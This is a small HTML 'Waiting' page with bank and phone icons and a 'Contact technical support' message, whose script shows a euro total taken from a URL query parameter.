<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .waiting-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .waiting-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .waiting-total {
            font-size: 1.2rem;
            font-weight: 500;
            margin-bottom: 1.2rem;
            color: #00b2ff;
        }
        .support-text {
            color: #222;
            font-size: 1.1rem;
            margin-bottom: 1.2rem;
        }
        .phone-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
            width: 48px;
            height: 48px;
            background: #00b2ff;
            border-radius: 50%;
        }
        .phone-icon svg {
            width: 28px;
            height: 28px;
            fill: #fff;
        }
        @media (max-width: 480px) {
            .waiting-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="waiting-card">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="waiting-title">Waiting</div>
        <div class="waiting-total" id="waiting-total"></div>
        <div class="support-text">Contact technical support</div>
        <div class="phone-icon">
            <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1C10.07 21 3 13.93 3 5a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.46.57 3.58a1 1 0 01-.24 1.01l-2.2 2.2z"/></svg>
        </div>
    </div>
    <script>
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Підтягуємо total
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('waiting-total').textContent = `Total: ${totalNum}€`;
        }
    }
    </script>
</body>
</html>
